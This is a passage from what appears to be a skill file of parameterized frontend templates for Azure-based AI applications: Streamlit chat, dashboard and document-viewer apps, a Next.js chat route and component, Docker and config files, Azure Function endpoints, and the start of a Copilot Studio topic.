---
name: ai-ucb:frontend-templates
description: AI Use Case Builder - Frontend Templates. Contains Streamlit, React/Next.js, Function App, Copilot Studio, and Power Apps scaffolds. Referenced by ai-ucb-frontend.md (Phase 4).
allowed-tools: Read, Grep, Glob, Bash, Edit, Write, Agent, AskUserQuestion
---

# AI Use Case Builder - Frontend Templates

All frontend scaffolds consumed by Phase 4. Each template is parameterized with `{app}`, `{deployment}`, `{index}` placeholders.

---

## 1. Streamlit Templates

### 1.1 Chat Interface (RAG / Conversational) [FULL]

```python
# app.py — Streamlit RAG Chat Application
import streamlit as st
import os
from openai import AzureOpenAI
from azure.search.documents import SearchClient
from azure.search.documents.models import VectorizedQuery
from azure.core.credentials import AzureKeyCredential

# --- Configuration (from environment variables) ---
AZURE_OPENAI_ENDPOINT = os.environ["AZURE_OPENAI_ENDPOINT"]
AZURE_OPENAI_KEY = os.environ["AZURE_OPENAI_KEY"]
DEPLOYMENT_NAME = os.environ["DEPLOYMENT_NAME"]
EMBEDDING_DEPLOYMENT = os.environ["EMBEDDING_DEPLOYMENT"]
AZURE_SEARCH_ENDPOINT = os.environ["AZURE_SEARCH_ENDPOINT"]
AZURE_SEARCH_KEY = os.environ["AZURE_SEARCH_KEY"]
AZURE_SEARCH_INDEX = os.environ["AZURE_SEARCH_INDEX"]

# --- Clients ---
openai_client = AzureOpenAI(
    azure_endpoint=AZURE_OPENAI_ENDPOINT,
    api_key=AZURE_OPENAI_KEY,
    api_version="2024-12-01-preview"
)

search_client = SearchClient(
    endpoint=AZURE_SEARCH_ENDPOINT,
    index_name=AZURE_SEARCH_INDEX,
    credential=AzureKeyCredential(AZURE_SEARCH_KEY)
)

# --- System Prompt (server-side only) ---
SYSTEM_PROMPT = """You are {app_name}, a Fluke AI assistant for {domain}.
Only answer questions using the provided context. If the context doesn't contain
relevant information, say "I don't have enough information to answer that."
Always cite your sources with [Source: filename]."""

# --- Helper Functions ---
def get_embedding(text: str) -> list:
    """Generate embedding for query text."""
    response = openai_client.embeddings.create(
        model=EMBEDDING_DEPLOYMENT,
        input=text
    )
    return response.data[0].embedding

def hybrid_search(query: str, top_k: int = 5) -> list:
    """Hybrid search: vector + full-text + semantic reranker."""
    embedding = get_embedding(query)
    results = search_client.search(
        search_text=query,
        vector_queries=[VectorizedQuery(
            vector=embedding,
            k_nearest_neighbors=top_k,
            fields="content_vector"
        )],
        query_type="semantic",
        semantic_configuration_name="semantic-config",
        top=top_k,
        select=["content", "source_file_path", "chunk_index"]
    )
    return [{"content": r["content"], "source": r["source_file_path"],
             "score": r["@search.score"]} for r in results]

def chat_with_context(messages: list, context: list) -> str:
    """Send chat completion with retrieved context."""
    context_text = "\n\n---\n\n".join(
        [f"[Source: {c['source']}]\n{c['content']}" for c in context]
    )
    system_msg = SYSTEM_PROMPT + f"\n\nContext:\n{context_text}"

    response = openai_client.chat.completions.create(
        model=DEPLOYMENT_NAME,
        messages=[{"role": "system", "content": system_msg}] + messages,
        temperature=0.3,
        max_tokens=1000,
        stream=True
    )
    return response

# --- Streamlit UI ---
st.set_page_config(page_title="{app_name}", page_icon="🔍", layout="wide")
st.title("{app_name}")
st.caption("Ask questions about your documents. Responses include source citations.")

# Initialize chat history
if "messages" not in st.session_state:
    st.session_state.messages = []

# Display chat history
for message in st.session_state.messages:
    with st.chat_message(message["role"]):
        st.markdown(message["content"])
        if "sources" in message:
            with st.expander("Sources"):
                for src in message["sources"]:
                    st.caption(f"📄 {src['source']} (score: {src['score']:.2f})")

# --- Input validation ---
MAX_INPUT_LENGTH = 4000

# Chat input
if prompt := st.chat_input("Ask a question..."):
    # Validate input length
    if len(prompt) > MAX_INPUT_LENGTH:
        st.warning(f"Message too long ({len(prompt)} chars). Max is {MAX_INPUT_LENGTH}.")
        st.stop()

    # Display user message
    st.session_state.messages.append({"role": "user", "content": prompt})
    with st.chat_message("user"):
        st.markdown(prompt)

    # Retrieve context
    with st.spinner("Searching documents..."):
        context = hybrid_search(prompt, top_k=5)

    # Generate response with streaming
    with st.chat_message("assistant"):
        message_placeholder = st.empty()
        full_response = ""
        chat_messages = [{"role": m["role"], "content": m["content"]}
                        for m in st.session_state.messages]

        stream = chat_with_context(chat_messages, context)
        for chunk in stream:
            if chunk.choices[0].delta.content:
                full_response += chunk.choices[0].delta.content
                message_placeholder.markdown(full_response + "▌")
        message_placeholder.markdown(full_response)

        # Show sources
        with st.expander("Sources"):
            for src in context:
                st.caption(f"📄 {src['source']} (score: {src['score']:.2f})")

    # Save to history
    st.session_state.messages.append({
        "role": "assistant", "content": full_response, "sources": context
    })

# --- Sidebar ---
with st.sidebar:
    st.header("About")
    st.markdown("Powered by Azure AI Services + AI Search")
    if st.button("Clear Chat"):
        st.session_state.messages = []
        st.rerun()
```

### 1.2 Dashboard Template (Predictive ML / Analytics) [FULL]

```python
# app.py — Streamlit ML Dashboard
import streamlit as st
import os
import mlflow
import pandas as pd
import plotly.express as px
import plotly.graph_objects as go
from azure.identity import DefaultAzureCredential
from azure.keyvault.secrets import SecretClient

st.set_page_config(page_title="{app_name} Dashboard", layout="wide")

# --- Auth & Config ---
credential = DefaultAzureCredential()
kv_client = SecretClient(vault_url=os.environ["KEY_VAULT_URL"], credential=credential)
DATABRICKS_HOST = kv_client.get_secret("databricks-host").value
DATABRICKS_TOKEN = kv_client.get_secret("databricks-token").value
SERVING_ENDPOINT = f"https://{DATABRICKS_HOST}/serving-endpoints/{os.environ['APP_SLUG']}-serving/invocations"

# --- MLflow model metrics ---
@st.cache_data(ttl=300)
def load_model_metrics():
    mlflow.set_tracking_uri(f"databricks://{DATABRICKS_HOST}")
    client = mlflow.tracking.MlflowClient()
    model_name = f"{os.environ['APP_SLUG']}_model"
    try:
        mv = client.get_model_version_by_alias(model_name, "champion")
        run = client.get_run(mv.run_id)
        return {
            "version": mv.version,
            "accuracy": run.data.metrics.get("accuracy", 0),
            "f1": run.data.metrics.get("f1_score", 0),
            "auc": run.data.metrics.get("auc", 0),
            "rmse": run.data.metrics.get("rmse", None),
            "training_date": mv.creation_timestamp,
        }
    except Exception as e:
        return {"error": str(e)}

# --- Recent predictions from Gold table ---
@st.cache_data(ttl=60)
def load_recent_predictions():
    import requests
    resp = requests.get(
        f"https://{DATABRICKS_HOST}/api/2.0/sql/statements",
        headers={"Authorization": f"Bearer {DATABRICKS_TOKEN}"},
        json={
            "warehouse_id": os.environ.get("SQL_WAREHOUSE_ID", ""),
            "statement": f"SELECT * FROM flukebi_Gold.{os.environ['APP_SLUG']}_predictions ORDER BY prediction_time DESC LIMIT 100",
        }, timeout=30
    )
    if resp.ok and resp.json().get("result"):
        cols = [c["name"] for c in resp.json()["result"]["schema"]["columns"]]
        data = resp.json()["result"]["data_array"]
        return pd.DataFrame(data, columns=cols)
    return pd.DataFrame()

# --- Prediction form ---
def predict_single(input_data: dict):
    import requests
    resp = requests.post(
        SERVING_ENDPOINT,
        headers={"Authorization": f"Bearer {DATABRICKS_TOKEN}", "Content-Type": "application/json"},
        json={"instances": [input_data]}, timeout=30
    )
    resp.raise_for_status()
    return resp.json()["predictions"][0]

# --- Layout ---
st.title(f"📊 {os.environ.get('APP_NAME', '{app_name}')} Dashboard")

# KPI row
metrics = load_model_metrics()
if "error" not in metrics:
    col1, col2, col3, col4 = st.columns(4)
    with col1:
        st.metric("Model Version", f"v{metrics['version']}")
    with col2:
        st.metric("Accuracy", f"{metrics['accuracy']:.1%}")
    with col3:
        st.metric("F1 Score", f"{metrics['f1']:.3f}")
    with col4:
        if metrics["rmse"]:
            st.metric("RMSE", f"{metrics['rmse']:.4f}")
        else:
            st.metric("AUC", f"{metrics['auc']:.3f}")
else:
    st.warning(f"Could not load model metrics: {metrics['error']}")

st.divider()

# Two-column layout: prediction form + feature importance
left, right = st.columns([1, 1])

with left:
    st.subheader("Make a Prediction")
    with st.form("predict_form"):
        # Dynamic form fields from feature schema (customize per use case)
        feature_inputs = {}
        st.caption("Enter feature values below:")
        # Placeholder: replace with actual feature columns from Gold schema
        feature_inputs["feature_1"] = st.number_input("Feature 1", value=0.0)
        feature_inputs["feature_2"] = st.number_input("Feature 2", value=0.0)
        feature_inputs["feature_3"] = st.selectbox("Category", ["A", "B", "C"])
        submitted = st.form_submit_button("Predict")
        if submitted:
            try:
                result = predict_single(feature_inputs)
                st.success(f"Prediction: **{result}**")
            except Exception as e:
                st.error(f"Prediction failed: {e}")

with right:
    st.subheader("Model Performance")
    # Feature importance chart (from MLflow logged artifact)
    if "error" not in metrics:
        try:
            client = mlflow.tracking.MlflowClient()
            model_name = f"{os.environ['APP_SLUG']}_model"
            mv = client.get_model_version_by_alias(model_name, "champion")
            artifacts = client.list_artifacts(mv.run_id)
            # Look for feature_importance artifact
            fi_path = next((a.path for a in artifacts if "feature_importance" in a.path), None)
            if fi_path:
                fi_df = pd.read_csv(client.download_artifacts(mv.run_id, fi_path))
                fig = px.bar(fi_df.sort_values("importance", ascending=True).tail(15),
                             x="importance", y="feature", orientation="h",
                             title="Top 15 Feature Importance")
                st.plotly_chart(fig, use_container_width=True)
        except Exception:
            st.info("Feature importance chart not available.")

st.divider()

# Recent predictions table
st.subheader("Recent Predictions")
df_pred = load_recent_predictions()
if not df_pred.empty:
    st.dataframe(df_pred, use_container_width=True, hide_index=True)
    csv = df_pred.to_csv(index=False)
    st.download_button("Download CSV", csv, "predictions.csv", "text/csv")
else:
    st.info("No recent predictions found. Run the pipeline to populate.")
```

### 1.3 Document Viewer Template (Doc Intelligence) [FULL]

```python
# app.py — Streamlit Document Intelligence Viewer
import streamlit as st
import os
import json
import time
import requests
import pandas as pd
from azure.identity import DefaultAzureCredential
from azure.keyvault.secrets import SecretClient
from azure.storage.blob import BlobServiceClient

st.set_page_config(page_title="{app_name} Doc Viewer", layout="wide")

# --- Auth & Config ---
credential = DefaultAzureCredential()
kv_client = SecretClient(vault_url=os.environ["KEY_VAULT_URL"], credential=credential)
FUNC_URL = os.environ.get("FUNCTION_APP_URL", "https://flk-{app}-func-dev.azurewebsites.net/api")
FUNC_KEY = kv_client.get_secret("function-app-key").value
BLOB_CONN = kv_client.get_secret("storage-connection-string").value
CONTAINER = f"{os.environ['APP_SLUG']}-uploads"

ALLOWED_TYPES = ["pdf", "docx", "png", "jpg", "jpeg", "tiff"]
MAX_FILE_SIZE_MB = 15

# --- Upload to Blob ---
def upload_to_blob(file_bytes, file_name):
    blob_service = BlobServiceClient.from_connection_string(BLOB_CONN)
    blob_client = blob_service.get_blob_client(container=CONTAINER, blob=file_name)
    blob_client.upload_blob(file_bytes, overwrite=True)
    return blob_client.url

# --- Trigger extraction ---
def trigger_extraction(blob_url, file_name):
    resp = requests.post(
        f"{FUNC_URL}/extract",
        headers={"x-functions-key": FUNC_KEY, "Content-Type": "application/json"},
        json={"blob_url": blob_url, "file_name": file_name},
        timeout=120
    )
    resp.raise_for_status()
    return resp.json()

# --- Layout ---
st.title(f"📄 {os.environ.get('APP_NAME', '{app_name}')} Document Intelligence")

# Sidebar: extraction history
with st.sidebar:
    st.subheader("Extraction History")
    if st.button("Refresh"):
        st.cache_data.clear()

    @st.cache_data(ttl=30)
    def load_history():
        try:
            resp = requests.get(
                f"{FUNC_URL}/extractions",
                headers={"x-functions-key": FUNC_KEY},
                timeout=30
            )
            return resp.json() if resp.ok else []
        except Exception:
            return []

    history = load_history()
    for item in history[:20]:
        status_icon = "✅" if item.get("status") == "complete" else "⏳" if item.get("status") == "processing" else "❌"
        if st.button(f"{status_icon} {item['file_name']}", key=item.get("id", item["file_name"])):
            st.session_state["selected_extraction"] = item

# Main area: upload + viewer
upload_tab, viewer_tab = st.tabs(["Upload & Extract", "View Results"])

with upload_tab:
    uploaded_file = st.file_uploader(
        "Upload a document",
        type=ALLOWED_TYPES,
        help=f"Max {MAX_FILE_SIZE_MB} MB. Supported: {', '.join(ALLOWED_TYPES)}"
    )

    if uploaded_file:
        file_size_mb = len(uploaded_file.getvalue()) / (1024 * 1024)
        if file_size_mb > MAX_FILE_SIZE_MB:
            st.error(f"File too large ({file_size_mb:.1f} MB). Max is {MAX_FILE_SIZE_MB} MB.")
        else:
            col1, col2 = st.columns([1, 1])
            with col1:
                st.caption(f"**File:** {uploaded_file.name} ({file_size_mb:.1f} MB)")
                if uploaded_file.name.lower().endswith(".pdf"):
                    # Show PDF preview (first page)
                    st.caption("PDF preview:")
                    st.write("(PDF rendering requires frontend JS — see React template for full preview)")
                elif uploaded_file.name.lower().endswith((".png", ".jpg", ".jpeg")):
                    st.image(uploaded_file, caption=uploaded_file.name, use_container_width=True)

            with col2:
                if st.button("Extract", type="primary"):
                    with st.spinner("Uploading and extracting..."):
                        try:
                            blob_url = upload_to_blob(uploaded_file.getvalue(), uploaded_file.name)
                            result = trigger_extraction(blob_url, uploaded_file.name)
                            st.session_state["last_result"] = result
                            st.success("Extraction complete!")
                        except Exception as e:
                            st.error(f"Extraction failed: {e}")

                if "last_result" in st.session_state:
                    result = st.session_state["last_result"]
                    st.subheader("Extracted Fields")
                    fields = result.get("fields", {})
                    for field_name, field_data in fields.items():
                        confidence = field_data.get("confidence", 0) if isinstance(field_data, dict) else 1.0
                        value = field_data.get("value", field_data) if isinstance(field_data, dict) else field_data
                        color = "green" if confidence > 0.9 else "orange" if confidence > 0.7 else "red"
                        st.markdown(f"**{field_name}:** {value} :{color}[({confidence:.0%})]")

                    # BOM table (if present)
                    bom = result.get("bom_items", [])
                    if bom:
                        st.subheader("Bill of Materials")
                        st.dataframe(pd.DataFrame(bom), use_container_width=True, hide_index=True)

                    # Export
                    st.divider()
                    col_json, col_csv = st.columns(2)
                    with col_json:
                        st.download_button(
                            "Download JSON", json.dumps(result, indent=2),
                            f"{uploaded_file.name}_extracted.json", "application/json"
                        )
                    with col_csv:
                        if bom:
                            csv = pd.DataFrame(bom).to_csv(index=False)
                            st.download_button("Download BOM CSV", csv, f"{uploaded_file.name}_bom.csv", "text/csv")

with viewer_tab:
    if "selected_extraction" in st.session_state:
        item = st.session_state["selected_extraction"]
        st.subheader(f"Results: {item['file_name']}")
        fields = item.get("fields", {})
        for field_name, field_data in fields.items():
            value = field_data.get("value", field_data) if isinstance(field_data, dict) else field_data
            st.markdown(f"**{field_name}:** {value}")
    else:
        st.info("Select an extraction from the sidebar to view results.")
```

### 1.4 Requirements.txt

```text
# requirements.txt — Streamlit RAG Application
streamlit>=1.32.0
openai>=1.12.0
azure-search-documents>=11.6.0
azure-identity>=1.15.0
azure-core>=1.30.0
python-dotenv>=1.0.0
```

### 1.5 Startup Script

```bash
#!/bin/bash
# startup.sh — App Service startup for Streamlit
python -m streamlit run app.py \
  --server.port 8000 \
  --server.address 0.0.0.0 \
  --server.headless true \
  --browser.gatherUsageStats false
```

---

## 2. React/Next.js Templates

### 2.1 Chat API Route [FULL]

```typescript
// app/api/chat/route.ts — Server-side chat endpoint
import { NextRequest, NextResponse } from "next/server";

const AZURE_OPENAI_ENDPOINT = process.env.AZURE_OPENAI_ENDPOINT!;
const AZURE_OPENAI_KEY = process.env.AZURE_OPENAI_KEY!;
const DEPLOYMENT_NAME = process.env.DEPLOYMENT_NAME!;
const EMBEDDING_DEPLOYMENT = process.env.EMBEDDING_DEPLOYMENT!;
const AZURE_SEARCH_ENDPOINT = process.env.AZURE_SEARCH_ENDPOINT!;
const AZURE_SEARCH_KEY = process.env.AZURE_SEARCH_KEY!;
const AZURE_SEARCH_INDEX = process.env.AZURE_SEARCH_INDEX!;

const SYSTEM_PROMPT = `You are {app_name}, a Fluke AI assistant for {domain}.
Only answer questions using the provided context. If the context doesn't contain
relevant information, say "I don't have enough information to answer that."
Always cite your sources with [Source: filename].`;

async function getEmbedding(text: string): Promise<number[]> {
  const response = await fetch(
    `${AZURE_OPENAI_ENDPOINT}/openai/deployments/${EMBEDDING_DEPLOYMENT}/embeddings?api-version=2024-12-01-preview`,
    {
      method: "POST",
      headers: { "Content-Type": "application/json", "api-key": AZURE_OPENAI_KEY },
      body: JSON.stringify({ input: text }),
    }
  );
  const data = await response.json();
  return data.data[0].embedding;
}

async function hybridSearch(query: string, topK: number = 5) {
  const embedding = await getEmbedding(query);
  const response = await fetch(
    `${AZURE_SEARCH_ENDPOINT}/indexes/${AZURE_SEARCH_INDEX}/docs/search?api-version=2024-07-01`,
    {
      method: "POST",
      headers: { "Content-Type": "application/json", "api-key": AZURE_SEARCH_KEY },
      body: JSON.stringify({
        search: query,
        vectorQueries: [{ vector: embedding, fields: "content_vector", kind: "vector", k: topK }],
        queryType: "semantic",
        semanticConfiguration: "semantic-config",
        top: topK,
        select: "content,source_file_path,chunk_index",
      }),
    }
  );
  const data = await response.json();
  return data.value.map((r: any) => ({
    content: r.content,
    source: r.source_file_path,
    score: r["@search.score"],
  }));
}

const MAX_MESSAGE_LENGTH = 4000;
const MAX_HISTORY_LENGTH = 50;

export async function POST(request: NextRequest) {
  // --- Input validation ---
  let body: any;
  try {
    body = await request.json();
  } catch {
    return NextResponse.json({ error: "Invalid JSON" }, { status: 400 });
  }

  const { messages } = body;
  if (!Array.isArray(messages) || messages.length === 0 || messages.length > MAX_HISTORY_LENGTH) {
    return NextResponse.json({ error: "Invalid messages array" }, { status: 400 });
  }

  const lastMessage = messages[messages.length - 1]?.content;
  if (typeof lastMessage !== "string" || lastMessage.length === 0 || lastMessage.length > MAX_MESSAGE_LENGTH) {
    return NextResponse.json({ error: "Invalid message content" }, { status: 400 });
  }

  // Retrieve context
  const context = await hybridSearch(lastMessage);
  const contextText = context
    .map((c: any) => `[Source: ${c.source}]\n${c.content}`)
    .join("\n\n---\n\n");

  // Stream response
  const response = await fetch(
    `${AZURE_OPENAI_ENDPOINT}/openai/deployments/${DEPLOYMENT_NAME}/chat/completions?api-version=2024-12-01-preview`,
    {
      method: "POST",
      headers: { "Content-Type": "application/json", "api-key": AZURE_OPENAI_KEY },
      body: JSON.stringify({
        messages: [
          { role: "system", content: `${SYSTEM_PROMPT}\n\nContext:\n${contextText}` },
          ...messages,
        ],
        temperature: 0.3,
        max_tokens: 1000,
        stream: true,
      }),
    }
  );

  // Forward the stream to the client
  return new NextResponse(response.body, {
    headers: { "Content-Type": "text/event-stream", "Cache-Control": "no-cache" },
  });
}
```

### 2.2 Chat Interface Component [FULL]

```tsx
// components/ChatInterface.tsx
"use client";
import { useState, useRef, useEffect, Component, ErrorInfo, ReactNode } from "react";
import ReactMarkdown from "react-markdown";
import rehypeSanitize from "rehype-sanitize";

// --- Error Boundary (catches render crashes in AI output) ---
interface ErrorBoundaryProps { children: ReactNode; }
interface ErrorBoundaryState { hasError: boolean; }
class ChatErrorBoundary extends Component<ErrorBoundaryProps, ErrorBoundaryState> {
  state: ErrorBoundaryState = { hasError: false };
  static getDerivedStateFromError(): ErrorBoundaryState { return { hasError: true }; }
  componentDidCatch(error: Error, info: ErrorInfo) { console.error("Chat render error:", error, info); }
  render() {
    if (this.state.hasError) {
      return <div className="p-4 text-red-600">Something went wrong rendering this message. Please refresh.</div>;
    }
    return this.props.children;
  }
}

interface Message {
  role: "user" | "assistant";
  content: string;
}

const MAX_INPUT_LENGTH = 4000; // Prevent oversized payloads

export default function ChatInterface() {
  const [messages, setMessages] = useState<Message[]>([]);
  const [input, setInput] = useState("");
  const [isLoading, setIsLoading] = useState(false);
  const messagesEndRef = useRef<HTMLDivElement>(null);

  useEffect(() => {
    messagesEndRef.current?.scrollIntoView({ behavior: "smooth" });
  }, [messages]);

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!input.trim() || isLoading || input.length > MAX_INPUT_LENGTH) return;

    const userMessage: Message = { role: "user", content: input };
    setMessages((prev) => [...prev, userMessage]);
    setInput("");
    setIsLoading(true);

    try {
      const response = await fetch("/api/chat", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ messages: [...messages, userMessage] }),
      });

      const reader = response.body?.getReader();
      const decoder = new TextDecoder();
      let assistantMessage = "";

      setMessages((prev) => [...prev, { role: "assistant", content: "" }]);

      while (reader) {
        const { done, value } = await reader.read();
        if (done) break;

        const chunk = decoder.decode(value);
        // Parse SSE chunks
        const lines = chunk.split("\n").filter((l) => l.startsWith("data: "));
        for (const line of lines) {
          const data = line.slice(6);
          if (data === "[DONE]") break;
          try {
            const parsed = JSON.parse(data);
            const content = parsed.choices?.[0]?.delta?.content || "";
            assistantMessage += content;
            setMessages((prev) => [
              ...prev.slice(0, -1),
              { role: "assistant", content: assistantMessage },
            ]);
          } catch {}
        }
      }
    } catch (error) {
      setMessages((prev) => [
        ...prev,
        { role: "assistant", content: "Sorry, an error occurred. Please try again." },
      ]);
    } finally {
      setIsLoading(false);
    }
  };

  return (
    <ChatErrorBoundary>
      <div className="flex flex-col h-full max-w-3xl mx-auto">
        <div className="flex-1 overflow-y-auto p-4 space-y-4">
          {messages.map((msg, i) => (
            <div key={i} className={`flex ${msg.role === "user" ? "justify-end" : "justify-start"}`}>
              <div className={`max-w-[80%] p-3 rounded-lg ${
                msg.role === "user" ? "bg-blue-600 text-white" : "bg-gray-100 text-gray-900"
              }`}>
                {msg.role === "assistant" ? (
                  // Sanitized markdown rendering — blocks XSS from model output
                  <ReactMarkdown rehypePlugins={[rehypeSanitize]}>
                    {msg.content || (isLoading && i === messages.length - 1 ? "Thinking..." : "")}
                  </ReactMarkdown>
                ) : (
                  // User messages render as plain text (no markdown interpretation)
                  msg.content
                )}
              </div>
            </div>
          ))}
          <div ref={messagesEndRef} />
        </div>
        <form onSubmit={handleSubmit} className="p-4 border-t flex gap-2">
          <input
            type="text"
            value={input}
            onChange={(e) => setInput(e.target.value.slice(0, MAX_INPUT_LENGTH))}
            placeholder="Ask a question..."
            className="flex-1 p-2 border rounded-lg"
            disabled={isLoading}
            maxLength={MAX_INPUT_LENGTH}
          />
          <button type="submit" disabled={isLoading}
            className="px-4 py-2 bg-blue-600 text-white rounded-lg disabled:opacity-50">
            Send
          </button>
        </form>
      </div>
    </ChatErrorBoundary>
  );
}
```

### 2.3 Dockerfile (Multi-Stage Build) [FULL]

```dockerfile
# Dockerfile — Next.js Multi-Stage Build
FROM node:20-alpine AS deps
WORKDIR /app
COPY package.json package-lock.json ./
RUN npm ci --only=production

FROM node:20-alpine AS builder
WORKDIR /app
COPY --from=deps /app/node_modules ./node_modules
COPY . .
RUN npm run build

FROM node:20-alpine AS runner
WORKDIR /app
ENV NODE_ENV production
COPY --from=builder /app/public ./public
COPY --from=builder /app/.next/standalone ./
COPY --from=builder /app/.next/static ./.next/static

EXPOSE 3000
ENV PORT 3000
CMD ["node", "server.js"]
```

### 2.4 next.config.js [FULL]

```javascript
// next.config.js
/** @type {import('next').NextConfig} */
const nextConfig = {
  output: "standalone", // Required for Docker deployment
  experimental: {
    serverActions: { allowedOrigins: ["flk-{app}-app-dev.azurewebsites.net"] },
  },
  headers: async () => [
    {
      source: "/:path*",
      headers: [
        // Security headers — prevent clickjacking, XSS, MIME sniffing
        { key: "X-Frame-Options", value: "DENY" },
        { key: "X-Content-Type-Options", value: "nosniff" },
        { key: "Referrer-Policy", value: "strict-origin-when-cross-origin" },
        { key: "Permissions-Policy", value: "camera=(), microphone=(), geolocation=()" },
        { key: "X-DNS-Prefetch-Control", value: "on" },
        {
          key: "Content-Security-Policy",
          value: "default-src 'self'; script-src 'self' 'unsafe-inline' 'unsafe-eval'; style-src 'self' 'unsafe-inline'; img-src 'self' data: blob:; connect-src 'self' https://*.openai.azure.com https://*.search.windows.net https://login.microsoftonline.com;",
        },
      ],
    },
    {
      source: "/api/:path*",
      headers: [
        { key: "Cache-Control", value: "no-store" },
      ],
    },
  ],
};

module.exports = nextConfig;
```

### 2.5 MSAL Auth Configuration [FULL]

```typescript
// lib/auth-config.ts
import { Configuration } from "@azure/msal-browser";

export const msalConfig: Configuration = {
  auth: {
    clientId: process.env.NEXT_PUBLIC_AAD_CLIENT_ID!,
    authority: `https://login.microsoftonline.com/${process.env.NEXT_PUBLIC_AAD_TENANT_ID}`,
    redirectUri: process.env.NEXT_PUBLIC_REDIRECT_URI || "http://localhost:3000",
  },
  cache: {
    cacheLocation: "sessionStorage",
    storeAuthStateInCookie: false,
  },
};

export const loginRequest = {
  scopes: ["User.Read"],
};
```

---

## 3. Function App Templates (API-Only)

### 3.1 Chat Function [FULL]

```python
# functions/chat/__init__.py
import azure.functions as func
import json
import os
import logging
from openai import AzureOpenAI
from azure.search.documents import SearchClient
from azure.search.documents.models import VectorizedQuery
from azure.core.credentials import AzureKeyCredential

app = func.FunctionApp()

openai_client = AzureOpenAI(
    azure_endpoint=os.environ["AZURE_OPENAI_ENDPOINT"],
    api_key=os.environ["AZURE_OPENAI_KEY"],
    api_version="2024-12-01-preview"
)

search_client = SearchClient(
    endpoint=os.environ["AZURE_SEARCH_ENDPOINT"],
    index_name=os.environ["AZURE_SEARCH_INDEX"],
    credential=AzureKeyCredential(os.environ["AZURE_SEARCH_KEY"])
)

SYSTEM_PROMPT = """You are {app_name}, a Fluke AI assistant.
Only answer using the provided context. Cite sources with [Source: filename]."""

@app.route(route="chat", methods=["POST"], auth_level=func.AuthLevel.FUNCTION)
def chat(req: func.HttpRequest) -> func.HttpResponse:
    try:
        body = req.get_json()
        messages = body.get("messages", [])
        query = messages[-1]["content"] if messages else ""

        # Embed query
        embed_resp = openai_client.embeddings.create(
            model=os.environ["EMBEDDING_DEPLOYMENT"], input=query
        )
        embedding = embed_resp.data[0].embedding

        # Hybrid search
        results = search_client.search(
            search_text=query,
            vector_queries=[VectorizedQuery(
                vector=embedding, k_nearest_neighbors=5, fields="content_vector"
            )],
            query_type="semantic",
            semantic_configuration_name="semantic-config",
            top=5, select=["content", "source_file_path"]
        )

        context = [{"content": r["content"], "source": r["source_file_path"]}
                   for r in results]
        context_text = "\n\n".join(
            [f"[Source: {c['source']}]\n{c['content']}" for c in context]
        )

        # Chat completion
        response = openai_client.chat.completions.create(
            model=os.environ["DEPLOYMENT_NAME"],
            messages=[
                {"role": "system", "content": f"{SYSTEM_PROMPT}\n\nContext:\n{context_text}"},
                *messages
            ],
            temperature=0.3, max_tokens=1000
        )

        return func.HttpResponse(
            json.dumps({
                "response": response.choices[0].message.content,
                "sources": context
            }),
            mimetype="application/json"
        )
    except Exception as e:
        logging.error(f"Chat error: {e}")
        return func.HttpResponse(
            json.dumps({"error": "An error occurred processing your request."}),
            status_code=500, mimetype="application/json"
        )
```

### 3.2 Health Check Functions (Liveness + Readiness) [FULL]

```python
# functions/health/__init__.py — Two-tier health endpoints
import azure.functions as func
import json
import os
import time

# --- Liveness: "Is the process alive?" (no dependency checks) ---
@app.route(route="health/live", methods=["GET"], auth_level=func.AuthLevel.ANONYMOUS)
def liveness(req: func.HttpRequest) -> func.HttpResponse:
    return func.HttpResponse(json.dumps({"status": "alive"}), mimetype="application/json")

# --- Readiness: "Can we serve traffic?" (checks all dependencies) ---
@app.route(route="health/ready", methods=["GET"], auth_level=func.AuthLevel.ANONYMOUS)
def readiness(req: func.HttpRequest) -> func.HttpResponse:
    checks = {}
    overall = "ready"

    # Check Azure OpenAI
    try:
        from openai import AzureOpenAI
        client = AzureOpenAI(
            azure_endpoint=os.environ["AZURE_OPENAI_ENDPOINT"],
            api_key=os.environ["AZURE_OPENAI_KEY"],
            api_version="2024-12-01-preview"
        )
        client.models.list()  # Lightweight API call
        checks["openai"] = "ok"
    except Exception as e:
        checks["openai"] = f"error: {type(e).__name__}"
        overall = "degraded"

    # Check Azure AI Search
    try:
        from azure.search.documents import SearchClient
        from azure.core.credentials import AzureKeyCredential
        sc = SearchClient(
            endpoint=os.environ["AZURE_SEARCH_ENDPOINT"],
            index_name=os.environ["AZURE_SEARCH_INDEX"],
            credential=AzureKeyCredential(os.environ["AZURE_SEARCH_KEY"])
        )
        sc.get_document_count()
        checks["search"] = "ok"
    except Exception as e:
        checks["search"] = f"error: {type(e).__name__}"
        overall = "degraded"

    status_code = 200 if overall == "ready" else 503
    return func.HttpResponse(
        json.dumps({"status": overall, "checks": checks, "timestamp": time.time()}),
        mimetype="application/json", status_code=status_code
    )
```

### 3.3 OpenAPI Specification [FULL]

```yaml
# openapi.yaml
openapi: "3.1.0"
info:
  title: "{app_name} API"
  version: "1.0.0"
  description: "AI-powered API for {domain}"
servers:
  - url: "https://flk-{app}-func-dev.azurewebsites.net/api"
    description: "Development"
paths:
  /chat:
    post:
      summary: "Chat with AI assistant"
      operationId: "chat"
      requestBody:
        required: true
        content:
          application/json:
            schema:
              type: object
              required: [messages]
              properties:
                messages:
                  type: array
                  items:
                    type: object
                    properties:
                      role: { type: string, enum: [user, assistant] }
                      content: { type: string }
      responses:
        "200":
          description: "Successful response"
          content:
            application/json:
              schema:
                type: object
                properties:
                  response: { type: string }
                  sources:
                    type: array
                    items:
                      type: object
                      properties:
                        content: { type: string }
                        source: { type: string }
  /health:
    get:
      summary: "Health check"
      operationId: "health"
      responses:
        "200":
          description: "Service health status"
```

### 3.4 host.json

```json
{
  "version": "2.0",
  "logging": {
    "applicationInsights": {
      "samplingSettings": { "isEnabled": true, "maxTelemetryItemsPerSecond": 20 }
    }
  },
  "extensions": {
    "http": {
      "routePrefix": "api",
      "maxOutstandingRequests": 200,
      "maxConcurrentRequests": 100
    }
  }
}
```

---

## 4. Copilot Studio Templates [FULL]

### 4.1 Topic Flow — Greeting

```yaml
# topics/greeting.yaml — Copilot Studio Topic Design
topic_name: "Greeting"
trigger_phrases:
  - "Hello"
  - "Hi"
  - "Hey"
  - "Good morning"
  - "Help"

flow:
  - action: "show_adaptive_card"
    card: "adaptive-cards/welcome-card.json"
    # Welcome card shows: app name, capabilities list, quick-start buttons

  - action: "ask_question"
    prompt: "What would you like to do?"
    options:
      - label: "Ask a question"
        redirect_topic: "Ask {app_name}"
      - label: "Upload a document"
